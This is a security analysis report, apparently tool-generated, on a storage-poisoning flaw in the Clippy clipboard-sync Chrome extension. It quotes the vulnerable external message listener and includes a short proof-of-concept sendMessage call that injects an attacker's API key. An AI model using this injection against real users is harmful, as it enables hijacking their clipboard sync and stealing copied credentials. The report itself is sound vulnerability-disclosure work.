# CoCo Analysis: honbeilkanbghjimjoniipnnehlmhggk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/honbeilkanbghjimjoniipnnehlmhggk/opgen_generated_files/bg.js
Line 1041          let apiKey = request.apiKey;
    request.apiKey

**Code:**

```javascript
// Line 1034-1081 - External message listener for registration
chrome.runtime.onMessageExternal.addListener(
    function(request, sender, sendResponse) {
        if (request.type == "login_api_token") {
          let apiKey = request.apiKey; // ← attacker-controlled
          let uid = request.uid;

          // get the token
          let senderId = globals.GCM_SENDER_ID;

          chrome.instanceID.getToken({
              authorizedEntity: senderId,
              scope: 'GCM'
          }, function(receivedToken) {
              token = receivedToken;

              // register new device with attacker-controlled apiKey
              sendHttpRequest("devices/add-new-device", apiKey, { name: "Chrome", token: token}, function(status, response) {

                  if(status == 200) {
                    response = JSON.parse(response)
                    // Store attacker-controlled api key in local storage
                    chrome.storage.local.set({
                      "user_prefs": {
                        "api_key": apiKey, // ← attacker-controlled value stored
                        "sync_enabled": response.data.switch_status,
                        "device_id": response.data.device_id
                      }
                    });

                    var event = new Event('signed_in')
                    document.dispatchEvent(event)

                    showNotification("Welcome!", "You are now signed in. Click on the Clippy extension icon to know more!")
                  } else {
                    showNotification("Something went wrong", "We are sorry!")
                  }
              })
          });
        }
    });

// Line 965-968 - Backend URL (hardcoded)
const globals = {
  API_BASE_URL: "https://api.clippy.works/",
  GCM_SENDER_ID: "557615072659",
};

// Line 988-1002 - HTTP request function
function sendHttpRequest(path, apiKey, data, callback) {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.open("POST", globals.API_BASE_URL + path);
    xmlhttp.setRequestHeader("Content-Type", "application/json");
    xmlhttp.setRequestHeader("Authorization", "Key=" + apiKey); // ← attacker-controlled
    xmlhttp.onreadystatechange = function() {
      if (this.readyState == 4) {
         if(typeof callback === "function")
            callback(this.status, this.responseText);
      }
    };
    xmlhttp.send(JSON.stringify(data));
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From the whitelisted domain (clippy.works) or any other extension that knows the extension ID
chrome.runtime.sendMessage(
  'honbeilkanbghjimjoniipnnehlmhggk', // Extension ID
  {
    type: 'login_api_token',
    apiKey: 'attacker_controlled_or_stolen_api_key',
    uid: 'attacker_uid'
  }
);
```

**Impact:** Storage poisoning and API key injection vulnerability. An external attacker (from clippy.works domain or other extensions) can inject arbitrary API keys into the extension's chrome.storage.local. While the backend validates the API key before storage, an attacker who possesses a valid API key (stolen, leaked, or their own) can:

1. Force another user's extension instance to authenticate with the attacker's API key
2. Gain access to that user's clipboard data through the attacker-controlled account
3. Potentially intercept or monitor clipboard syncing operations
4. Redirect clipboard sync traffic through the attacker's account

This is particularly severe for a clipboard syncing extension, as it could allow an attacker to capture sensitive information (passwords, credentials, personal data) that the victim copies to their clipboard. The attacker-controlled apiKey is used in the Authorization header for all subsequent API requests, effectively hijacking the user's clipboard sync functionality.
